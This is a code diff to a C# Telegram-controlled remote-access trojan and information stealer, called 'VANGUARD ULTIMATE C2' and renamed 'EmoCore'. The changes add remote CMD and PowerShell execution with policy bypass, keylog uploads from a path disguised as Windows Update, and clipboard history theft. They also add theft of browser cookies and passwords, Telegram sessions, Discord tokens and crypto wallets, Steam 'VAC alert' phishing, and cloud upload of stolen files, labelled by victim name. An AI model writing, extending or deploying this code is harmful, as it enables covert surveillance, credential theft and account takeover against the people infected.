@@ -83,6 +83,7 @@ namespace FinalBot
 
         public async Task HandleUpdateAsync(ITelegramBotClient botClient, Update update, CancellationToken cancellationToken)
         {
+            Log($"[UPDATE] Type: {update.Type} | ID: {update.Id}");
             try
             {
                 var message = update.Message ?? update.EditedMessage;
@@ -95,7 +96,7 @@ namespace FinalBot
                         var markup = new InlineKeyboardMarkup(new[]
                         {
                             new[] { InlineKeyboardButton.WithCallbackData("✅ ДА, ИНЖЕКТИРОВАТЬ КУКИ (STEAM)", "vac_inject_f_" + shortId) },
-                            new[] { InlineKeyboardButton.WithCallbackData("❌ НЕТ, ПРОСТО ФАЙЛ", "back_to_main") }
+                            
                         });
                         await _botClient.SendTextMessageAsync(_adminId, "🍪 <b>Обнаружен JSON файл.</b> Инжектировать как куки Steam?", parseMode: ParseMode.Html, replyMarkup: markup);
                     }
@@ -124,10 +125,20 @@ namespace FinalBot
 
         public async Task HandleCommand(TgMessage message)
         {
-            if (message.From?.Id.ToString() != _adminId) return;
+            if (message == null) return;
+            string senderId = (message.From?.Id.ToString() ?? "0").Trim();
+            string chatId = (message.Chat.Id.ToString() ?? "0").Trim();
+            string targetId = (_adminId ?? "").Trim();
+            
+            // Allow if sender is admin OR message is in the admin chat
+            if (senderId != targetId && chatId != targetId) 
+            {
+                Log($"[AUTH FAILURE] Denied message from {senderId} (Chat: {chatId}). Expected: {targetId}");
+                return;
+            }
 
             string text = message.Text ?? "";
-            Log($"[CMD] Received text: {text}");
+            Log($"[CMD] Received text from {senderId}: {text}");
 
             // Normalize command: /cmd@botname args -> /cmd args
             if (text.StartsWith("/"))
@@ -140,6 +151,11 @@ namespace FinalBot
                     text = baseCmd + (spaceIndex > 0 ? text.Substring(spaceIndex) : "");
                 }
             }
+            
+            // Re-normalize /panel case
+            if (text.ToLower().StartsWith("/panel")) text = "/panel";
+            if (text.ToLower().StartsWith("/start")) text = "/start";
+            if (text.ToLower().StartsWith("/menu")) text = "/menu";
 
             if (_userState.TryGetValue(message.Chat.Id, out string state))
             {
@@ -147,7 +163,7 @@ namespace FinalBot
                 {
                     _userState.Remove(message.Chat.Id);
                     PhishManager.SetAgentName(text); 
-                    await _botClient.SendTextMessageAsync(message.Chat.Id, $"✅ <b>Имя агента успешно поменял:</b> <code>{text}</code>", parseMode: ParseMode.Html);
+                    await _botClient.SendTextMessageAsync(message.Chat.Id, GetRichText($"✅ <b>Имя агента успешно поменял:</b> <code>{text}</code>"), parseMode: ParseMode.Html);
                     Log($"[PHISH] Agent name updated to: {text}");
                     return;
                 }
@@ -155,14 +171,35 @@ namespace FinalBot
                 {
                     _userState.Remove(message.Chat.Id);
                     PhishManager.SetCookies(text); 
-                    await _botClient.SendTextMessageAsync(message.Chat.Id, "✅ <b>Куки успешно принял и сохранил!</b>", parseMode: ParseMode.Html);
+                    await _botClient.SendTextMessageAsync(message.Chat.Id, GetRichText("✅ <b>Куки успешно принял и сохранил!</b>"), parseMode: ParseMode.Html);
                     return;
                 }
                 else if (state == "awaiting_victim_name")
                 {
                     ConfigManager.VictimName = text;
                     _userState.Remove(message.Chat.Id);
-                    await _botClient.SendTextMessageAsync(message.Chat.Id, $"✅ <b>Имя жертвы изменено на:</b> <code>{text}</code>", parseMode: ParseMode.Html);
+                    
+                    // Sync with python telemetry bridge
+                    PhishManager.SyncToDisk();
+
+                    await _botClient.SendTextMessageAsync(message.Chat.Id, GetRichText($"✅ <b>Имя жертвы изменено на:</b> <code>{text}</code>"), parseMode: ParseMode.Html);
+                    await ShowAdminPanel(message.Chat.Id);
+                    return;
+                }
+                else if (state == "awaiting_shell_cmd")
+                {
+                    _userState.Remove(message.Chat.Id);
+                    await _botClient.SendTextMessageAsync(message.Chat.Id, GetRichText($"⚙️ <i>Executing CMD:</i> <code>{text}</code>"), parseMode: ParseMode.Html);
+                    string res = await ShellManager.ExecuteCommand(text);
+                    await _botClient.SendTextMessageAsync(message.Chat.Id, GetRichText($"🏁 <b>CMD Result:</b>\n<code>{WebUtility.HtmlEncode(res)}</code>"), parseMode: ParseMode.Html);
+                    return;
+                }
+                else if (state == "awaiting_shell_ps")
+                {
+                    _userState.Remove(message.Chat.Id);
+                    await _botClient.SendTextMessageAsync(message.Chat.Id, GetRichText($"⚙️ <i>Executing PowerShell:</i> <code>{text}</code>"), parseMode: ParseMode.Html);
+                    string res = await ShellManager.ExecuteCommand($"powershell -ExecutionPolicy Bypass -Command \"{text}\"");
+                    await _botClient.SendTextMessageAsync(message.Chat.Id, GetRichText($"🏁 <b>PS Result:</b>\n<code>{WebUtility.HtmlEncode(res)}</code>"), parseMode: ParseMode.Html);
                     return;
                 }
                 else if (state == "awaiting_discord_token")
@@ -170,41 +207,53 @@ namespace FinalBot
                     _discordToken = text.Trim();
                     _userState.Remove(message.Chat.Id);
                     _userState[message.Chat.Id] = "awaiting_discord_channel";
-                    await _botClient.SendTextMessageAsync(message.Chat.Id, "✅ Токен сохранен.\n⌨️ <b>Теперь введи ссылку на голосовой канал Discord:</b>", parseMode: ParseMode.Html);
+                    await _botClient.SendTextMessageAsync(message.Chat.Id, GetRichText("✅ Токен сохранен.\n⌨️ <b>Теперь введи ссылку на голосовой канал Discord:</b>"), parseMode: ParseMode.Html);
                     return;
                 }
                 else if (state == "awaiting_discord_channel")
                 {
                     _discordChannelUrl = text.Trim();
                     _userState.Remove(message.Chat.Id);
-                    await _botClient.SendTextMessageAsync(message.Chat.Id, $"✅ <b>Ссылка установлена.</b>\n🚀 Запускаю бота...", parseMode: ParseMode.Html);
+                    await _botClient.SendTextMessageAsync(message.Chat.Id, GetRichText($"✅ <b>Ссылка установлена.</b>\n🚀 Запускаю бота..."), parseMode: ParseMode.Html);
                     Log($"[DISCORD_REMOTE] Token: {_discordToken[..Math.Min(8, _discordToken.Length)]}... | URL: {_discordChannelUrl}");
                     string res = DiscordRemoteManager.LaunchDiscordBot(_discordToken, _discordChannelUrl, "join");
-                    await _botClient.SendTextMessageAsync(message.Chat.Id, res);
+                    await _botClient.SendTextMessageAsync(message.Chat.Id, GetRichText(res));
                     return;
                 }
                 else if (state == "awaiting_discord_tokenurl")
                 {
-                    // Format: token | invite_url
                     _userState.Remove(message.Chat.Id);
-                    string[] parts = text.Split('|');
+                    string[] parts = text.Contains("|") ? text.Split('|') : text.Split('\n');
+                    
                     if (parts.Length >= 2)
                     {
                         string tkn = parts[0].Trim();
                         string url = parts[1].Trim();
                         _discordToken = tkn;
                         _discordChannelUrl = url;
-                        await _botClient.SendTextMessageAsync(message.Chat.Id, $"✅ Данные приняты.\n🚀 Запускаю Discord Remote Bot (Прогресс будет ниже)...", parseMode: ParseMode.Html);
-                        Log($"[DISCORD_REMOTE] Token: {tkn[..Math.Min(8, tkn.Length)]}... | URL: {url}");
                         
-                        // Launch with explicit progress tracking
-                        TgMessage msg = await _botClient.SendTextMessageAsync(message.Chat.Id, "🎮 <b>Discord Remote Bot</b>\n━━━━━━━━━━━━━━━━━━\n🚀 Запуск...\n━━━━━━━━━━━━━━━━━━", parseMode: ParseMode.Html);
-                        _lastDiscordMessageId = msg.MessageId;
-                        DiscordRemoteManager.LaunchDiscordBot(tkn, url, "join");
+                        string maskedToken = tkn.Length > 12 ? tkn.Substring(0, 8) + "..." + tkn.Substring(tkn.Length - 4) : tkn;
+                        string confirmMsg = $"✅ <b>Данные приняты!</b>\n\n" +
+                                            $"🔑 <b>Токен:</b> <code>{maskedToken}</code>\n" +
+                                            $"🔊 <b>Канал:</b> <code>{url}</code>\n\n" +
+                                            $"🚀 <i>Инициализация Selenium...</i>";
+
+                        await _botClient.SendTextMessageAsync(message.Chat.Id, GetRichText(confirmMsg), parseMode: ParseMode.Html, disableWebPagePreview: true);
+                        Log($"[DISCORD_REMOTE] Token Received. Launching bot...");
+                        
+                        string result = DiscordRemoteManager.LaunchDiscordBot(tkn, url, "join");
+                        if (result.StartsWith("❌"))
+                        {
+                            await _botClient.SendTextMessageAsync(message.Chat.Id, GetRichText(result), parseMode: ParseMode.Html);
+                        }
+                        else
+                        {
+                            await _botClient.SendTextMessageAsync(message.Chat.Id, GetRichText("🚀 <b>Discord Remote Process Initiated.</b>"), parseMode: ParseMode.Html);
+                        }
                     }
                     else
                     {
-                        await _botClient.SendTextMessageAsync(message.Chat.Id, "❌ Неверный формат. Используй: <code>токен | ссылка</code>", parseMode: ParseMode.Html);
+                        await _botClient.SendTextMessageAsync(message.Chat.Id, GetRichText("❌ <b>Ошибка формата.</b>\nНужно: <code>токен | ссылка</code>\nЛибо в две строки."), parseMode: ParseMode.Html);
                     }
                     return;
                 }
@@ -260,6 +309,7 @@ namespace FinalBot
             {
                 string newName = text.Substring(9).Trim();
                 ConfigManager.VictimName = newName;
+                PhishManager.SyncToDisk();
                 await _botClient.SendTextMessageAsync(message.Chat.Id, $"✅ Victim name updated: `{newName}`");
                 await ShowAdminPanel(message.Chat.Id);
             }
@@ -328,6 +378,24 @@ namespace FinalBot
                     case "clipboard_summary":
                         await HandleClipboardSummary(message.Chat.Id);
                         break;
+                    case "clipboard_get_file":
+                        await _botClient.AnswerCallbackQueryAsync(callbackQuery.Id, "📁 Собираю историю буфера...");
+                        string clipPath = Modules.ClipboardModule.GetHistoryFilePath();
+                        if (System.IO.File.Exists(clipPath))
+                        {
+                            using var stream = System.IO.File.OpenRead(clipPath);
+                            await _botClient.SendDocumentAsync(message.Chat.Id, InputFile.FromStream(stream, "clip_history.txt"), caption: "📋 <b>История буфера обмена</b>", parseMode: ParseMode.Html);
+                        }
+                        else await _botClient.SendTextMessageAsync(message.Chat.Id, "❌ История пуста.");
+                        break;
+                    case "shell_cmd":
+                        _userState[message.Chat.Id] = "awaiting_shell_cmd";
+                        await _botClient.SendTextMessageAsync(message.Chat.Id, "⌨️ <b>Введите CMD команду:</b>", parseMode: ParseMode.Html);
+                        break;
+                    case "shell_ps":
+                        _userState[message.Chat.Id] = "awaiting_shell_ps";
+                        await _botClient.SendTextMessageAsync(message.Chat.Id, "⌨️ <b>Введите PowerShell команду:</b>", parseMode: ParseMode.Html);
+                        break;
                     case "keylog_get":
                         await HandleKeylogGet(message.Chat.Id);
                         break;
@@ -375,6 +443,18 @@ namespace FinalBot
                     case "vac_launch":
                         await _botClient.AnswerCallbackQueryAsync(callbackQuery.Id, "⏳ Launching VAC Alert...");
                         await HandleVacLaunch(message.Chat.Id);
+                        break;
+                    
+                    case "vac_toggle_block":
+                    case "toggle_steam_block":
+                        if (!await CheckTarget(callbackQuery.Id)) return;
+                        Modules.PhishManager.ToggleGlobalBlock();
+                        ConfigManager.Save();
+                        
+                        await _botClient.AnswerCallbackQueryAsync(callbackQuery.Id, $"🛡 Steam Blocker: {(Modules.PhishManager.GlobalBlockSteam ? "LOCKED" : "UNLOCKED")}");
+                        
+                        if (data == "vac_toggle_block") await ShowVacPanel(message.Chat.Id, message.MessageId);
+                        else await ShowWorkPanel(message.Chat.Id, message.MessageId);
                         break;
                     
                     case "vac_lang_toggle":
@@ -515,7 +595,22 @@ namespace FinalBot
                                                  $"⚖️ <b>Size:</b> <code>{size}</code>\n" +
                                                  $"━━━━━━━━━━━━━━━━━━";
 
-                                await _botClient.SendTextMessageAsync(message.Chat.Id, $"⬆️ <i>Uploading:</i> <code>{info.Name}</code>...", parseMode: ParseMode.Html);
+                                 if (info.Length > 49 * 1024 * 1024)
+                                 {
+                                     await _botClient.SendTextMessageAsync(message.Chat.Id, GetRichText($"⚙️ <b>Large File Detected:</b> <code>{info.Name}</code>\n━━━━━━━━━━━━━━━━━━\n<i>Bypassing Telegram 50MB limit...\n⬆️ Uploading to Cloud... Please wait.</i>"), parseMode: ParseMode.Html);
+                                     string? cloudUrl = await CloudUploader.UploadFileAsync(realPath);
+                                     if (!string.IsNullOrEmpty(cloudUrl))
+                                     {
+                                         string successMsg = $"✅ <b>Cloud Upload Complete!</b>\n━━━━━━━━━━━━━━━━━━\n📂 <b>File:</b> <code>{info.Name}</code>\n🔗 <b>Link: {cloudUrl}</b>";
+                                         await _botClient.SendTextMessageAsync(message.Chat.Id, GetRichText(successMsg), parseMode: ParseMode.Html);
+                                     }
+                                     else
+                                     {
+                                         await _botClient.SendTextMessageAsync(message.Chat.Id, GetRichText($"❌ <b>Cloud Upload Failed.</b>\n━━━━━━━━━━━━━━━━━━\nTry manual split or check internet connection."), parseMode: ParseMode.Html);
+                                     }
+                                     return;
+                                 }
+                                await _botClient.SendTextMessageAsync(message.Chat.Id, GetRichText($"⬆️ <i>Uploading:</i> <code>{info.Name}</code>..."), parseMode: ParseMode.Html);
                                 using var stream = File.OpenRead(realPath);
                                 await _botClient.SendDocumentAsync(message.Chat.Id, InputFile.FromStream(stream, info.Name), caption: caption, parseMode: ParseMode.Html);
                             }
@@ -567,29 +662,29 @@ namespace FinalBot
 
         private async Task HandleVideoRecord(long chatId)
         {
-            await _botClient.SendTextMessageAsync(chatId, "🎥 <i>Recording screen (10s)...</i>", parseMode: ParseMode.Html);
+            await _botClient.SendTextMessageAsync(chatId, GetRichText("🎥 <i>Recording screen (10s)...</i>"), parseMode: ParseMode.Html);
             string? path = await VideoModule.RecordScreen(10);
             if (path != null)
             {
                 using var stream = File.OpenRead(path);
-                await _botClient.SendDocumentAsync(chatId, InputFile.FromStream(stream, "screen_record.zip"), caption: "🎥 Screen recording sequence");
+                await _botClient.SendDocumentAsync(chatId, InputFile.FromStream(stream, $"{ConfigManager.VictimName}_Screen.zip"), caption: GetRichText("🎥 Screen recording sequence"));
                 File.Delete(path);
             }
-            else await _botClient.SendTextMessageAsync(chatId, "❌ Video recording failed.");
+            else await _botClient.SendTextMessageAsync(chatId, GetRichText("❌ Video recording failed."), parseMode: ParseMode.Html);
         }
 
         private async Task HandleClipboard(long chatId)
         {
             string text = ClipboardModule.GetClipboardText();
             if (!string.IsNullOrEmpty(text))
-                await _botClient.SendTextMessageAsync(chatId, $"📋 <b>Clipboard:</b>\n<code>{WebUtility.HtmlEncode(text)}</code>", parseMode: ParseMode.Html);
-            else await _botClient.SendTextMessageAsync(chatId, "❌ Clipboard is empty.");
+                await _botClient.SendTextMessageAsync(chatId, GetRichText($"📋 <b>Clipboard:</b>\n<code>{WebUtility.HtmlEncode(text)}</code>"), parseMode: ParseMode.Html);
+            else await _botClient.SendTextMessageAsync(chatId, GetRichText("❌ Clipboard is empty."), parseMode: ParseMode.Html);
         }
 
         private async Task HandleClipboardSummary(long chatId)
         {
             string summary = ClipboardModule.GetSummary();
-            await _botClient.SendTextMessageAsync(chatId, $"📋 <b>Clipboard Summary:</b>\n\n{summary}", parseMode: ParseMode.Html);
+            await _botClient.SendTextMessageAsync(chatId, GetRichText($"📋 <b>Clipboard Summary:</b>\n\n{summary}"), parseMode: ParseMode.Html);
         }
         
         private async Task HandleKeylogGet(long chatId)
@@ -597,95 +692,144 @@ namespace FinalBot
              string logFile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft", "Windows", "Update", "svc_keys.log");
              if (File.Exists(logFile))
              {
-                 await _botClient.SendTextMessageAsync(chatId, "⌨️ <i>Uploading keylogs...</i>", parseMode: ParseMode.Html);
+                 await _botClient.SendTextMessageAsync(chatId, GetRichText("⌨️ <i>Uploading keylogs...</i>"), parseMode: ParseMode.Html);
+                 string outName = $"{ConfigManager.VictimName}_Keys.txt";
                  using var stream = File.OpenRead(logFile);
-                 await _botClient.SendDocumentAsync(chatId, InputFile.FromStream(stream, "Keylogs.txt"), caption: "⌨️ Remote Keylogs");
+                 await _botClient.SendDocumentAsync(chatId, InputFile.FromStream(stream, outName), caption: GetRichText("⌨️ <b>Remote Keylogs Captured</b>"), parseMode: ParseMode.Html);
              }
-             else await _botClient.SendTextMessageAsync(chatId, "❌ No keylogs found yet.");
+             else await _botClient.SendTextMessageAsync(chatId, GetRichText("❌ <b>ERROR:</b> No keylogs found yet."), parseMode: ParseMode.Html);
         }
 
         private async Task HandleSystemInfo(long chatId)
         {
             string info = SystemInfoModule.GetSystemInfo();
-            await _botClient.SendTextMessageAsync(chatId, info, parseMode: ParseMode.Markdown);
+            await _botClient.SendTextMessageAsync(chatId, GetRichText(info), parseMode: ParseMode.Markdown);
         }
 
         private async Task HandleWifiProfiles(long chatId)
         {
             string res = await ShellManager.ExecuteCommand("netsh wlan show profiles");
-            await _botClient.SendTextMessageAsync(chatId, $"📶 <b>WiFi Profiles:</b>\n<pre>{WebUtility.HtmlEncode(res)}</pre>", parseMode: ParseMode.Html);
+            await _botClient.SendTextMessageAsync(chatId, GetRichText($"📶 <b>WiFi Profiles:</b>\n<pre>{WebUtility.HtmlEncode(res)}</pre>"), parseMode: ParseMode.Html);
         }
 
         private async Task HandleWindowHistory(long chatId)
         {
-             await _botClient.SendTextMessageAsync(chatId, "📜 <i>Feature pending implementation in native module.</i>", parseMode: ParseMode.Html);
+             await _botClient.SendTextMessageAsync(chatId, GetRichText("📜 <i>Feature pending implementation in native module.</i>"), parseMode: ParseMode.Html);
         }
 
         private async Task HandleDiscordSteal(long chatId)
         {
-            await _botClient.SendTextMessageAsync(chatId, "💬 <i>Scanning for Discord tokens...</i>", parseMode: ParseMode.Html);
+            await _botClient.SendTextMessageAsync(chatId, GetRichText("💬 <b>SCANNING:</b> <i>Discord environment artifacts...</i>"), parseMode: ParseMode.Html);
             var service = new ChatService();
             string report = await service.Run();
-            await _botClient.SendTextMessageAsync(chatId, report, parseMode: ParseMode.Html);
+            await _botClient.SendTextMessageAsync(chatId, GetRichText(report), parseMode: ParseMode.Html);
         }
 
         private async Task HandleBrowserSteal(long chatId)
         {
-            await _botClient.SendTextMessageAsync(chatId, "🌍 <i>Scanning browsers...</i>", parseMode: ParseMode.Html);
-            var service = new DataService();
-            var report = await service.RunAll();
-            await _botClient.SendTextMessageAsync(chatId, report, parseMode: ParseMode.Html);
-
-            string tempDir = Path.Combine(Path.GetTempPath(), "MsUpdateSvc");
-            string outputDir = Path.Combine(tempDir, "VOutput");
-            if (Directory.Exists(outputDir))
+            var msg = await _botClient.SendTextMessageAsync(chatId, GetRichText("🌍 <b>SCANNING hosts...</b> <i>(Chrome, Edge, Opera, etc)</i>"), parseMode: ParseMode.Html);
+            var service = new Microsoft.UpdateService.Modules.DataService();
+            var result = await service.RunCompleteSteal();
+            
+            if (result.Success && !string.IsNullOrEmpty(result.OutputDir))
             {
-                string zipPath = Path.Combine(Path.GetTempPath(), "BrowserData.zip");
-                if (File.Exists(zipPath)) File.Delete(zipPath);
-                ZipFile.CreateFromDirectory(outputDir, zipPath);
-                using var stream = File.OpenRead(zipPath);
-                await _botClient.SendDocumentAsync(chatId, InputFile.FromStream(stream, "BrowserData.zip"), caption: "🔓 Browser Data");
-                File.Delete(zipPath);
-                Directory.Delete(outputDir, true);
+                string successMsg = $"🔓 <b>Browser Data Captured!</b>\n" +
+                                    $"━━━━━━━━━━━━━━━━━━\n" +
+                                    $"{result.Message}\n" +
+                                    $"━━━━━━━━━━━━━━━━━━\n";
+
+                await _botClient.EditMessageTextAsync(chatId, msg.MessageId, GetRichText(successMsg), parseMode: ParseMode.Html);
+                await _botClient.SendTextMessageAsync(chatId, GetRichText("🛰️ <b>ZIPPING:</b> <i>Preparing consolidated archive...</i>"), parseMode: ParseMode.Html);
+                
+                string uniqueId = Guid.NewGuid().ToString("N").Substring(0, 6);
+                string zipName = $"{ConfigManager.VictimName}_{uniqueId}_Browsers.zip";
+                string zipPath = Path.Combine(Path.GetTempPath(), zipName);
+                
+                try
+                {
+                    if (File.Exists(zipPath)) File.Delete(zipPath);
+                    ZipFile.CreateFromDirectory(result.OutputDir, zipPath);
+                    
+                    using (var stream = new FileStream(zipPath, FileMode.Open, FileAccess.Read, FileShare.Read))
+                    {
+                        await _botClient.SendDocumentAsync(chatId, InputFile.FromStream(stream, zipName), caption: GetRichText("🔓 <b>CONSOLIDATED LOGS</b>\n🍪 Total Cookies: " + result.CookieCount + "\n🔑 Total Passwords: " + result.PasswordCount), parseMode: ParseMode.Html);
+                    }
+                    
+                    try { File.Delete(zipPath); } catch { }
+                    await _botClient.SendTextMessageAsync(chatId, GetRichText("✅ <b>SUCCESS:</b> Browser data uploaded."), parseMode: ParseMode.Html);
+                }
+                catch (Exception ex)
+                {
+                    await _botClient.SendTextMessageAsync(chatId, GetRichText($"❌ <b>ZIP Error:</b> <code>{ex.Message}</code>"), parseMode: ParseMode.Html);
+                }
+            }
+            else
+            {
+                await _botClient.EditMessageTextAsync(chatId, msg.MessageId, GetRichText(result.Message), parseMode: ParseMode.Html);
             }
         }
 
         private async Task HandleCryptoSteal(long chatId)
         {
-            await _botClient.SendTextMessageAsync(chatId, "💰 <i>Scanning crypto wallets...</i>", parseMode: ParseMode.Html);
+            await _botClient.SendTextMessageAsync(chatId, GetRichText("💰 <b>SCANNING:</b> <i>Crypto-wallet signatures...</i>"), parseMode: ParseMode.Html);
             var service = new CryptoService();
             string report = await service.Run(Path.GetTempPath());
-            await _botClient.SendTextMessageAsync(chatId, report, parseMode: ParseMode.Html);
+            await _botClient.SendTextMessageAsync(chatId, GetRichText(report), parseMode: ParseMode.Html);
         }
 
         private async Task HandleTelegramSteal(long chatId)
         {
-            await _botClient.SendTextMessageAsync(chatId, "✈️ <i>Scanning Telegram sessions...</i>", parseMode: ParseMode.Html);
+            await _botClient.SendTextMessageAsync(chatId, GetRichText("✈️ <b>SCANNING:</b> <i>Telegram Desktop sessions...</i>"), parseMode: ParseMode.Html);
             var service = new MessengerService();
             string result = service.Run();
-            if (result.StartsWith("❌")) await _botClient.SendTextMessageAsync(chatId, result);
+            if (result.StartsWith("❌")) await _botClient.SendTextMessageAsync(chatId, GetRichText(result));
             else
             {
-                string zipPath = Path.Combine(Path.GetTempPath(), "TG_Session.zip");
+                string zipName = $"{ConfigManager.VictimName}_Telegram.zip";
+                string zipPath = Path.Combine(Path.GetTempPath(), zipName);
                 if (File.Exists(zipPath)) File.Delete(zipPath);
                 ZipFile.CreateFromDirectory(result, zipPath);
-                using (var stream = File.OpenRead(zipPath)) await _botClient.SendDocumentAsync(chatId, InputFile.FromStream(stream, "Telegram_Sessions.zip"));
+                
+                using (var stream = File.OpenRead(zipPath)) 
+                    await _botClient.SendDocumentAsync(chatId, InputFile.FromStream(stream, zipName), caption: GetRichText("🔓 <b>TG Data Captured</b>"), parseMode: ParseMode.Html);
+                
                 File.Delete(zipPath);
                 Directory.Delete(result, true);
+                await _botClient.SendTextMessageAsync(chatId, GetRichText("✅ <b>SUCCESS:</b> Telegram session uploaded."), parseMode: ParseMode.Html);
             }
         }
 
         private async Task HandleFullReport(long chatId)
         {
-            await _botClient.SendTextMessageAsync(chatId, "🚀 <i>Generating full report...</i>", parseMode: ParseMode.Html);
+            await _botClient.SendTextMessageAsync(chatId, GetRichText("🚀 <b>GENERATING:</b> <i>Building comprehensive full report...</i>"), parseMode: ParseMode.Html);
             string? zipPath = await ReportManager.CreateFullReport();
             if (zipPath != null)
             {
-                using var stream = File.OpenRead(zipPath);
-                await _botClient.SendDocumentAsync(chatId, InputFile.FromStream(stream, Path.GetFileName(zipPath)), caption: "📦 Full Data Report");
-                File.Delete(zipPath);
+                string timestamp = DateTime.Now.ToString("HHmmss");
+                string zipName = $"{ConfigManager.VictimName}_FullReport_{timestamp}.zip";
+                string newZipPath = Path.Combine(Path.GetTempPath(), zipName);
+                
+                try 
+                {
+                    if (File.Exists(newZipPath)) File.Delete(newZipPath);
+                    File.Move(zipPath, newZipPath);
+
+                    using (var stream = new FileStream(newZipPath, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
+                    {
+                        await _botClient.SendDocumentAsync(chatId, InputFile.FromStream(stream, zipName), caption: GetRichText("📦 <b>Vanguard Full Report Locked</b>"), parseMode: ParseMode.Html);
+                    }
+                    
+                    // Delay cleanup to ensure file handles are released
+                    _ = Task.Run(async () => { await Task.Delay(2000); try { File.Delete(newZipPath); } catch { } });
+                    await _botClient.SendTextMessageAsync(chatId, GetRichText("✅ <b>SUCCESS:</b> Full report finalized."), parseMode: ParseMode.Html);
+                }
+                catch (Exception ex)
+                {
+                    Log($"[REPORT ERROR] {ex.Message}");
+                    await _botClient.SendTextMessageAsync(chatId, GetRichText($"❌ <b>FILE ERROR:</b> <code>{WebUtility.HtmlEncode(ex.Message)}</code>"), parseMode: ParseMode.Html);
+                }
             }
-            else await _botClient.SendTextMessageAsync(chatId, "❌ Report generation failed.");
+            else await _botClient.SendTextMessageAsync(chatId, GetRichText("❌ <b>ERROR:</b> Report generation failed."), parseMode: ParseMode.Html);
         }
 
         private async Task ShowAdminPanel(long chatId, int messageId = 0)
@@ -694,10 +838,10 @@ namespace FinalBot
             {
                 new[]
                 {
-                    InlineKeyboardButton.WithCallbackData("💻 СИСТЕМА", "panel_system"),
-                    InlineKeyboardButton.WithCallbackData("💼 РАБОТА", "panel_work")
+                    InlineKeyboardButton.WithCallbackData("💻 SYSTEM", "panel_system"),
+                    InlineKeyboardButton.WithCallbackData("💼 WORK", "panel_work")
                 },
-                new[] { InlineKeyboardButton.WithCallbackData("🕵️‍♂️ ШПИОНАЖ", "panel_spyware") },
+                new[] { InlineKeyboardButton.WithCallbackData("🕵️‍♂️ SPYWARE", "panel_spyware") },
                 new[]
                 {
                     InlineKeyboardButton.WithCallbackData("👥 СЕССИИ", "sessions_list"),
@@ -708,7 +852,7 @@ namespace FinalBot
             });
 
             string status = _targetVictimId == null ? "🌐 ГЛОБАЛЬНЫЙ" : $"🎯 {(_targetVictimId == ConfigManager.VictimName ? "АКТИВЕН" : "ОЖИДАНИЕ")}";
-            string info = $"💎 <b>VANGUARD ULTIMATE C2</b>\n" +
+            string info = $"💎 <b>EmoCore</b>\n" +
                           $"━━━━━━━━━━━━━━━━━━\n" +
                           $"👤 <b>Жертва:</b> <code>{ConfigManager.VictimName}</code>\n" +
                           $"📍 <b>Режим:</b> <code>{status}</code>\n" +
@@ -723,22 +867,23 @@ namespace FinalBot
         {
             var markup = new InlineKeyboardMarkup(new[]
             {
-                new[] { InlineKeyboardButton.WithCallbackData("📋 БУФЕР", "clipboard"), InlineKeyboardButton.WithCallbackData("📜 СТАТИСТИКА", "clipboard_summary") },
+                new[] { InlineKeyboardButton.WithCallbackData("📂 ФАЙЛ-МЕНЕДЖЕР", "file_manager") },
+                new[] { InlineKeyboardButton.WithCallbackData("🐚 CMD", "shell_cmd"), InlineKeyboardButton.WithCallbackData("📜 POWERSHELL", "shell_ps") },
                 new[]
                 {
                     InlineKeyboardButton.WithCallbackData("⚙️ ИНФО", "system_info"),
                     InlineKeyboardButton.WithCallbackData("📶 ПРОЦЕССЫ", "proc_list")
                 },
                 new[] { InlineKeyboardButton.WithCallbackData(ProxyModule.IsActive ? "🌐 ПРОКСИ 🟢" : "🌐 ПРОКСИ 🔴", "proxy_toggle") },
-                new[] { InlineKeyboardButton.WithCallbackData("📡 WIFI ПРОФИЛИ", "wifi_profiles") },
                 new[] { InlineKeyboardButton.WithCallbackData("🔙 НАЗАД", "back_to_main") }
             });
 
-            await EditOrSend(chatId, messageId, "💻 <b>СИСТЕМНАЯ ПАНЕЛЬ</b>\nУправление файлами и процессами:", markup);
+            await EditOrSend(chatId, messageId, "💻 <b>СИСТЕМНАЯ ПАНЕЛЬ</b>\n━━━━━━━━━━━━━━━━━━\nУправление файлами и процессами:", markup);
         }
 
         private async Task ShowWorkPanel(long chatId, int messageId)
         {
+            string steamStatus = Modules.PhishManager.GlobalBlockSteam ? "🔒 LOCKED" : "🔓 UNLOCKED";
             var markup = new InlineKeyboardMarkup(new[]
             {
                 new[]
@@ -746,6 +891,7 @@ namespace FinalBot
                     InlineKeyboardButton.WithCallbackData("🚀 VAC АЛЕРТ", "vac_panel"),
                     InlineKeyboardButton.WithCallbackData("🚀 STEAM ФИШИНГ", "work_steam_phish")
                 },
+                new[] { InlineKeyboardButton.WithCallbackData($"🚫 STEAM БЛОК: {steamStatus}", "toggle_steam_block") },
                 new[]
                 {
                     InlineKeyboardButton.WithCallbackData("💬 DISCORD", "work_discord"),
@@ -768,6 +914,7 @@ namespace FinalBot
             var markup = new InlineKeyboardMarkup(new[]
             {
                 new[] { InlineKeyboardButton.WithCallbackData("🚀 ЗАПУСТИТЬ ОКНО VAC", "vac_launch") },
+                new[] { InlineKeyboardButton.WithCallbackData(PhishManager.GlobalBlockSteam ? "🛡 БЛОК STEAM [ВКЛ]" : "🛡 БЛОК STEAM [ВЫКЛ]", "vac_toggle_block") },
                 new[]
                 {
                     InlineKeyboardButton.WithCallbackData(lang == "en" ? "🇺🇸 ENGLISH" : "🇨🇳 CHINESE", "vac_toggle_lang"),
@@ -791,11 +938,11 @@ namespace FinalBot
             try
             {
                 PhishManager.LaunchSteamAlert();
-                await _botClient.SendTextMessageAsync(chatId, "🚀 <b>VAC Alert Launched!</b>", parseMode: ParseMode.Html);
+                await _botClient.SendTextMessageAsync(chatId, GetRichText("🚀 <b>SUCCESS:</b> VAC Alert Engine launched."), parseMode: ParseMode.Html);
             }
             catch (Exception ex)
             {
-                await _botClient.SendTextMessageAsync(chatId, $"❌ Launch failed: {ex.Message}");
+                await _botClient.SendTextMessageAsync(chatId, GetRichText($"❌ <b>ERROR:</b> Launch failed: <code>{ex.Message}</code>"), parseMode: ParseMode.Html);
             }
         }
 
@@ -826,7 +973,7 @@ namespace FinalBot
                 new[]
                 {
                     InlineKeyboardButton.WithCallbackData("📋 БУФЕР", "clipboard"),
-                    InlineKeyboardButton.WithCallbackData("📜 СТАТИСТИКА", "clipboard_summary")
+                   InlineKeyboardButton.WithCallbackData("📄 ИСТОРИЯ (TXT)", "clipboard_get_file")
                 },
                 new[]
                 {
@@ -849,7 +996,7 @@ namespace FinalBot
                 new[] { InlineKeyboardButton.WithCallbackData("🔙 НАЗАД", "back_to_main") }
             });
